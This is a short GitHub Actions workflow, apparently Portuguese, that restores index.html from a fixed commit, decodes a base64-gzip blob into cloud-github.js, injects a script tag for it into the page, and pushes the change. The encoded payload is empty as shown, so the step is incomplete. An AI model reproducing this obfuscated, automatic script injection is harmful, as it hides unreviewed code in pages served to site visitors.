name: Ativar nuvem privada
on:
  push:
    paths:
      - .github/workflows/ativar-nuvem-github.yml
permissions:
  contents: write
jobs:
  activate:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: |
          git show 4466caace9e542a093b92367344b72802aed46a8:index.html > index.html
          echo  | base64 -d | gzip -d > cloud-github.js
          printf '\n<script src="cloud-github.js"></script>\n' >> index.html
          git config user.name github-actions[bot]
          git config user.email 41898282+github-actions[bot]@users.noreply.github.com
          git add index.html cloud-github.js
          git commit -m "Ativa nuvem privada pelo GitHub" || exit 0
          git push
